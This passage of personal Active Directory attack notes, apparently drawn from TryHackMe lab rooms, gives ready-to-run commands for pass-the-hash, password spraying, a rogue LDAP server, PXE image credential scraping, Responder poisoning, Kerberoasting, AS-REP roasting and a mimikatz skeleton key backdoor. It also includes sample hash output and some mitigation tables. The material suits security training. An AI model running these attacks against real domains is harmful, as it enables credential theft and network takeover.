crackmapexec smb --local-auth $network_cidr -u administrator -H $hash | grep +
```

### [-] Password-Spray Web Login with NTLM

[ntlm_passwordspray.py](Active%20Directory%20Attacks%20402e784322a8465b8ef4d00050f1e657/ntlm_passwordspray.py)

```powershell
**python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Password123 -a http://ntlmauth.za.tryhackme.com/**
```

## [+] **Mitigation**

Several steps can be taken to mitigate the risk of password spraying attacks. While no single solution will entirely prevent the attack, a defense-in-depth approach will render password spraying attacks extremely difficult.

| Technique | Description |
| --- | --- |
| Multi-factor Authentication | Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals. |
| Restricting Access | It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it. |
| Reducing Impact of Successful Exploitation | A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise. |
| Password Hygiene | Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts. |

# ______________________________________________________________________

# [=] **LDAP Pass-back Attacks**

### Details

LDAP authentication is a popular mechanism with third-party (non-Microsoft) applications that integrate with AD. These include applications and systems such as:

- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs
- some IT devices like Printer could have a web interface for configuration without passwords or with the default, You can change the configuration to make your self the LDAP server then run LDAP server on your machine using `OpenLDAP` with bad configuration (plain text authentication) and sniffing the traffic using wireshark or tcpdump

## [+] Hosting Rogue LDAP server

```powershell
**sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd

echo "#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred" >> olcSaslSecProps.ldif

sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms  # We can verify that our rogue LDAP server's configuration has been applied

# [thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
# dn:
# supportedSASLMechanisms: PLAIN
# supportedSASLMechanisms: LOGIN**
```

- Explanation
    - **olcSaslSecProps:** Specifies the SASL security properties
    - **noanonymous:** Disables mechanisms that support anonymous login
    - **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

## [+] **Capturing LDAP Credentials Using `tcpdump`**

```powershell
**sudo tcpdump -SX -i $interface tcp port 389**
```

# ______________________________________________________________________

# Exploiting Microsoft Deployment Toolkit (**MDT) (Not good Notes)**

### Details

Large organisations need tools to deploy and manage the 
infrastructure of the estate. In massive organisations, you can't have 
your IT personnel using DVDs or even USB Flash drives running around 
installing software on every single machine. Luckily, Microsoft already 
provides the tools required to manage the estate. However, we can 
exploit misconfigurations in these tools to also breach AD.

# MDT and SCCM

Microsoft Deployment Toolkit (MDT) is a Microsoft service that 
assists with automating the deployment of Microsoft Operating Systems 
(OS). Large organisations use services such as MDT to help deploy new 
images in their estate more efficiently since the base images can be 
maintained and updated in a central location.

# 

Usually,
 MDT is integrated with Microsoft's System Center Configuration Manager 
(SCCM), which manages all updates for all Microsoft applications, 
services, and operating systems. MDT is used for new deployments. 
Essentially it allows the IT team to preconfigure and manage boot 
images. Hence, if they need to configure a new machine, they just need 
to plug in a network cable, and everything happens automatically. They 
can make various changes to the boot image, such as already installing 
default software like Office365 and the organisation's anti-virus of 
choice. It can also ensure that the new build is updated the first time 
the installation runs.

SCCM can be seen as almost an expansion and
 the big brother to MDT. What happens to the software after it is 
installed? Well, SCCM does this type of patch management. It allows the 
IT team to review available updates to all software installed across the
 estate. The team can also test these patches in a sandbox environment 
to ensure they are stable before centrally deploying them to all 
domain-joined machines. It makes the life of the IT team significantly 
easier.

However, anything that provides central management of 
infrastructure such as MDT and SCCM can also be targetted by attackers 
in an attempt to take over large portions of critical functions in the 
estate. Although MDT can be configured in various ways, for this task, 
we will focus exclusively on a configuration called Preboot Execution 
Environment (PXE) boot.

**PXE Boot**

Large organisations use PXE boot to allow new devices that are connected to the network to load and install the OS
 directly over a network connection. MDT can be used to create, manage, 
and host PXE boot images. PXE boot is usually integrated with DHCP, 
which means that if DHCP assigns an IP lease, the host is allowed to 
request the PXE boot image and start the network OS installation 
process. The communication flow is shown in the diagram below**:**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png)

Once
 the process is performed, the client will use a TFTP connection to 
download the PXE boot image. We can exploit the PXE boot image for two 
different purposes:

- Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
- Perform password scraping attacks to recover AD credentials used during the install.

In
 this task, we will focus on the latter. We will attempt to recover the 
deployment service account associated with the MDT service during 
installation for this password scraping attack. Furthermore, there is 
also the possibility of retrieving other AD accounts used for the 
unattended installation of applications and services.

**PXE Boot Image Retrieval**

Since
 DHCP is a bit finicky, we will bypass the initial steps of this attack.
 We will skip the part where we attempt to request an IP and the PXE 
boot preconfigure details from DHCP. We will perform the rest of the 
attack from this step in the process manually.

The first piece of
 information regarding the PXE Boot preconfigure you would have received
 via DHCP is the IP of the MDT server. In our case, you can recover that
 information from the TryHackMe network diagram.

The second 
piece of information you would have received was the names of the BCD 
files. These files store the information relevant to PXE Boots for the 
different types of architecture. To retrieve this information, you will 
need to connect to this website: [http://pxeboot.za.tryhackme.com](http://pxeboot.za.tryhackme.com/). It will list various BCD files:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/63264e3ddce1a8b438a7c8b6d527688c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/63264e3ddce1a8b438a7c8b6d527688c.png)

Usually,
 you would use TFTP to request each of these BCD files and enumerate the
 configuration for all of them. However, in the interest of time, we 
will focus on the BCD file of the **x64** architecture. Copy and store the full name of this file. For the rest of this exercise, we will be using this name placeholder `x64{7B...B3}.bcd`
 since the files and their names are regenerated by MDT every day. Each 
time you see this placeholder, remember to replace it with your specific
 BCD filename.

With this initial information now 
recovered from DHCP (wink wink), we can enumerate and retrieve the PXE 
Boot image. We will be using our SSH connection on THMJMP1 for the next 
couple of steps, so please authenticate to this SSH session using the 
following:

`ssh thm@THMJMP1.za.tryhackme.com`

and the password of `Password1@`.

To
 ensure that all users of the network can use SSH, start by creating a 
folder with your username and copying the powerpxe repo into this 
folder:

SSH Command Prompt

```
C:\Users\THM>cd Documents
C:\Users\THM\Documents> mkdir <username>
C:\Users\THM\Documents> copy C:\powerpxe <username>\
C:\Users\THM\Documents\> cd <username>
```

The first step we need to perform is using T

FTP

and downloading our BCD file to read the configuration of the MDT 
server. TFTP is a bit trickier than FTP since we can't list files. 
Instead, we send a file request, and the server will connect back to us 
via UDP to transfer the file. Hence, we need to be accurate when 
specifying files and file paths. The BCD files are always located in the
 /Tmp/ directory on the MDT server. We can initiate the TFTP transfer 
using the following command in our SSH session:

SSH Command Prompt

```
C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
```

You will have to lookup THMMDT IP with

```
nslookup thmmdt.za.tryhackme.com
```

. With the BCD file now recovered, we will be using

[powerpxe](https://github.com/wavestone-cdt/powerpxe)

to read its contents. Powerpxe is a PowerShell script that 
automatically performs this type of attack but usually with varying 
results, so it is better to perform a manual approach. We will use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file:

SSH Command Prompt

```
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location><PXE Boot Image Location>
```

WIM
 files are bootable images in the Windows Imaging Format (WIM). Now that
 we have the location of the PXE Boot image, we can again use TFTP to 
download this image:

SSH Command Prompt

```
PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
```

This
 download will take a while since you are downloading a fully bootable 
and configured Windows image. Maybe stretch your legs and grab a glass 
of water while you wait.

# Recovering Credentials from a PXE Boot Image

Now
 that we have recovered the PXE Boot image, we can exfiltrate stored 
credentials. It should be noted that there are various attacks that we 
could stage. We could inject a local administrator user, so we have 
admin access as soon as the image boots, we could install the image to 
have a domain-joined machine. If you are interested in learning more 
about these attacks, you can read this [article](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/). This exercise will focus on a simple attack of just attempting to exfiltrate credentials.

Again
 we will use powerpxe to recover the credentials, but you could also do 
this step manually by extracting the image and looking for the 
bootstrap.ini file, where these types of credentials are often stored. 
To use powerpxe to recover the credentials from the bootstrap file, run 
the following command:

SSH Command Prompt

```
PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```

As you can see, powerpxe was able to recover the AD credentials. We now have another set of AD credentials that we can use!

```bash
tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd

PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
```

# ______________________________________________________________________

# [=] Authentication Relays

### Details

- Continuing with attacks that can be staged from our rogue device, we will now look at attacks against broader network authentication protocols. In Windows networks, there are a significant amount of services talking to each other, allowing users to make use of the services provided by the network.
- These services have to use built-in authentication methods to verify the identity of incoming connections. In Task 2, we explored NTLM Authentication used on a web application. In this task, we will dive a bit deeper to look at how this authentication looks from the network's perspective. However, for this task, we will focus on NetNTLM authentication used by SMB.Server Message Block
- The Server Message Block (SMB) protocol allows clients (like workstations) to communicate with a server (like a file share). In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Even the "out of paper" alert your computer receives when you try to print a document is the work of the SMB protocol.
- However, the security of earlier versions of the SMB protocol was deemed insufficient. Several vulnerabilities and exploits 
were discovered that could be leveraged to recover credentials or even gain code execution on devices. Although some of these vulnerabilities were resolved in newer versions of the protocol, often organisations do not enforce the use of more recent versions since legacy systems do not support them. We will be looking at two different exploits for NetNTLM 
authentication with SMB:
    - Since the NTLM Challenges can be intercepted, we can use offline
    cracking techniques to recover the password associated
    with the NTLM Challenge. However, this cracking process is significantly slower than cracking NTLM hashes directly.
    - We can use
    our rogue device to stage a man in the middle attack, relaying the SMB
    authentication between the client and server, which will provide us with an active authenticated session and access to the target server.

# LLMNR, NBT-NS, and WPAD

- In this task, we will take a bit of a look at the authentication that occurs during the use of SMB. We will use Responder to attempt to intercept the NetNTLM challenge to crack it. There are usually a lot of these challenges flying around on the network. Some security solutions even perform a sweep of entire IP ranges to recover information from hosts. Sometimes due to stale DNS records, these authentication challenges can end up hitting your rogue device instead of the intended host.
- Responder
 allows us to perform Man-in-the-Middle attacks by poisoning the 
responses during NetNTLM authentication, tricking the client into 
talking to you instead of the actual server they wanted to connect to. On a real LAN, Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Servier (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. Rather than overburdening network resources such as the DNS servers, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. The NBT-NS is the precursor protocol to LLMNR, and WPAD requests are made to try and find a proxy for future HTTP(s) connections.
- Since these protocols rely on requests broadcasted on the local network, our rogue device would also receive these requests. Usually, these requests would simply be dropped since they were not meant for our host. However, Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. By poisoning these requests, Responder attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication.

# Intercepting NetNTLM Challenge

- One thing to note is that Responder essentially tries to win the race condition by poisoning the connections to ensure that you intercept the connection. This means that Responder is usually limited to poisoning authentication challenges on the local network. Since we are connected via a VPN to the network, we will only be able to poison authentication challenges that occur on this VPN network. For this reason, we have simulated an authentication request that can be poisoned that runs every 30 minutes. This means that you may have to wait a bit before you can intercept the NetNTLM challenge.
- Although Responder would be able to intercept and poison more authentication requests when executed from our rogue device connected to the LAN of an organisation, it is crucial to understand that this behaviour can be disruptive and thus detected. By poisoning authentication requests, normal network authentication attempts would fail, meaning users and services would not connect to the hosts and shares they intend to. Do keep this in mind when using Responder on a security assessment.
- Responder has already been installed on the AttackBox. However, if you are not using the AttackBox, you can download and install it from this repo:  [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder). We will set Responder to run on the interface connected to the VPN:
- `sudo responder -I tun0`
- If
 you are using the AttackBox not all of the Responder services will be able to start since other services are already using those ports. However, this will not impact this task. Also, make sure you specify `tun0` or `tun1`
- depending on which tunnel has your network IP. Responder will now listen for any LLMNR, NBT-NS, or WPAD requests that are coming in. We would leave Responder to run for a bit on a real LAN. However, in our case, we have to simulate this poisoning by having one of the servers attempt to authenticate to machines on the VPN. Leave Responder running for a bit (average 10 minutes, get some fresh air!), and you should receive an SMBv2 connection which Responder can use to entice and extract an NTLMv2-SSP challenge. It will look something like this:

NTLM Password Spraying Attack

```
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : <Client IP>
[SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username>
[SMBv2] NTLMv2-SSP Hash     : <Service Account Username>::ZA:<NTLMv2-SSP Hash>
```

If we were using our rogue device, we would probably run Responder for quite some time, capturing several challenges. Once we have a couple, we can start to perform some offline cracking of the challenges in the hopes of recovering their associated NTLM passwords. If the accounts have weak passwords configured, we have a good chance of successfully cracking them. Copy the NTLMv2-SSP Hash to a textfile. We will then use the password list provided in the downloadable files for this task and Hashcat in an attempt to crack the hash using the following command:

`hashcat -m 5600 <hash file> <password file>   --force`

The password file has been provided for you on the AttackBox in the `/root/Rooms/BreachingAD/task5/`
 directory or as a downloadable task file. We use hashtype 5600, which corresponds with NTLMv2-SSP for hashcat. If you use your own machine, you will have to install [Hashcat](https://hashcat.net/hashcat/) first.

Any hashes that we can crack will now provide us with AD credentials for our breach!**Relaying the Challenge**

In
 some instances, however, we can take this a step further by trying to relay the challenge instead of just capturing it directly. This is a little bit more difficult to do without prior knowledge of the accounts since this attack depends on the permissions of the associated account. We need a couple of things to play in our favour:

- SMB Signing should either be disabled or enabled but not enforced. When we perform a relay, we make minor changes to the request to pass it along. If SMB
signing is enabled, we won't be able to forge the message signature,
meaning the server would reject it.
- The associated account needs the relevant permissions on the server to access the requested
resources. Ideally, we are looking to relay the challenge of an account
with administrative privileges over the server, as this would allow us
to gain a foothold on the host.
- Since we technically don't yet
have an AD foothold, some guesswork is involved into what accounts will
have permissions on which hosts. If we had already breached AD, we could perform some initial enumeration first, which is usually the case.

This is why blind relays are not usually popular. Ideally, you would first breach AD using another method and then perform enumeration to determine the privileges associated with the account you have compromised. From here, you can usually perform lateral movement for privilege escalation across the domain. However, it is still good to fundamentally under how a relay attack works, as shown in the diagram below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f8b172fe8934125813481fc9da20801c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f8b172fe8934125813481fc9da20801c.png)

If you want to try this type of attack in action, head over to the [Holo Network](https://tryhackme.com/jr/hololive). We will also come back to this one in future AD Rooms.

---

![Untitled](Active%20Directory%20Attacks%20402e784322a8465b8ef4d00050f1e657/Untitled.png)

- It’s Preferable to do this attack at the beginning of the day because all the employees come to the company and the initial authentication requests sent

```bash
sudo responder -I $interface
```

# ______________________________________________________________________

# [=] Kerberoasting

- Crack TGS Encryption key → Service Password
- The Idea: If you have the TGS but you don’t have the permissions to use the service (like SQL server)-you are authenticated but not authorized, You can crack the TGS to get the service password (remember the encryption key is the service password)
- Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account
- I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins

## [+] Kerberoasting ⇒ `GetSPNUsers.py`

[impacket repository](https://github.com/SecureAuthCorp/impacket)

[impacket-0.10.0.tar.gz](Active%20Directory%20Attacks%20402e784322a8465b8ef4d00050f1e657/impacket-0.10.0.tar.gz)

[GetUserSPNs.py](Active%20Directory%20Attacks%20402e784322a8465b8ef4d00050f1e657/GetUserSPNs.py)

```bash
**python3 GetUserSPNs.py domain.local/username:password -dc-ip $IP**
```

```bash
**python3 GetUserSPNs.py domain.local/username:password -dc-ip $IP -request** 
```

---

## [+] Kerberoasting ⇒ **`Rubeus`**

[Rubues Kerberoasting](https://github.com/GhostPack/Rubeus#kerberoast)

```powershell
PS> Rubeus.exe kerberoast /nowrap 
```

---

## [+] Kerberoasting ⇒ `powershell`

```powershell
Add-Type -AssemblyName System.IdentityModel  # this namespace is not loaded into powershell instance by default 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPN'
klist # list the tickets 
mimikatz.exe # to download the ticket from memory
mimikatz> kerberos::list /export 
```

---

## [+] Cracking

- crack the hash with `john` or `hashcat`

```bash
hashcat -m 13100 -a 0 hash.txt PassList.txt
```

---

## [+] Kerberoasting Mitigation

- Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
- Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make
service accounts domain admins.

# ______________________________________________________________________

# [=] AS-REP Roasting

## [+] `GetNPUsers.py`

- Get Non Pre-auth Users
- Authentication Service Response Roasting
    
    ![Untitled](Active%20Directory%20Attacks%20402e784322a8465b8ef4d00050f1e657/Untitled%201.png)
    
- If Kerberos Pre-authentication is not required, You can ask for TGT without sending the user password (Skip AS-REQ)

```bash
**python impacket/examples/GetNPUsers.py domain.local/username -dc-ip <IP> # then enter any password** 
```

```bash
**impacket-GetNPUsers spookysec.local/ -dc-ip <IP>  -usersfile Valid_Users.txt**
```

### [-] AS-REP Roasting w/ Rubeus

<aside>
💡 Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

</aside>

**AS-REP Roasting Overview** 

> During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.
> 

**Dumping KRBASREP5 Hashes w/ Rubeus :**

```bash
C:\Users\Administrator\Downloads>Rubeus.exe asreproast

[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::8d92:d3ee:f484:1784%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:F5B49B1BBDB679E2163F4FE4A4FABFB7$8B3DB20D2708
      180C6DF0C904528D11C88305EFDAD408C1E97E8249042DF13AD9BD70CB177D98DAACFFEF6C0C689A
      7430B369F11AB...

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::8d92:d3ee:f484:1784%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:2AA61EA6539C0883604C13767AE6C748$09AB04BD502E0
      9A3316FE12975295F38F5BD1906C00B33FB2C1AD09291CD59AF86A100BC07E37C8C8B85014714F8A
      DC3EBB4D97E76E8...
```

---

## [+] other Methods (If Pre-Auth. is disabled)

### [-] fuzzing username if you don’t know any username

### [-] Sniff TGT

- sniff using wireshark then add “Kerberos” as a filter,  view AS-REP > Kerberos > ticket > enc-part

---

## [+] Cracking

- Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User..…, to avoid `Signature unmatched` error

```bash
hashcat -m 18200 hash.txt wordlist.txt
```

---

## [+] AS-REP Roasting Mitigations

- Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
- Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

# ______________________________________________________________________

```bash
# you should install these two tools  
pip3 install bloodhound # install bloodhound-python 
apt install bloodhound # install bloodhound GUI 
ulimit -n 100000
sudo neo4j start 
bloodhound & 
firefox http://localhost:7474/browser/ # username: neo4j , password: neo4j 
# change the username and the password 
# login to bloodhound and upload result JSON files of bloodhound-python 
```

```bash
bloodhound-python -u <username> -p <password> -ns <DC IP> -c All 
```

# ______________________________________________________________________

# ______________________________________________________________________

# [=] Skeleton Backdoor

### [+] Installing the Skeleton Key w/ mimikatz -

1.) `misc::skeleton` - Yes! that's it but don't underestimate this small command it is very powerful

![https://i.imgur.com/wI802gw.png](https://i.imgur.com/wI802gw.png)

# ______________________________________________________________________

# [=] Accessing the forest

The default credentials will be: "*mimikatz*"

example: `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

example: `dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however
 that is out of scope for this room.

---

---

- Kerbrute Enumeration - No domain access required
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required
- Silver Ticket - Service hash required
- Skeleton Key - Full domain compromise (domain admin) required

# ______________________________________________________________________

# [=] Resources

- [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
- [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)
- [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
- [https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)
- [https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)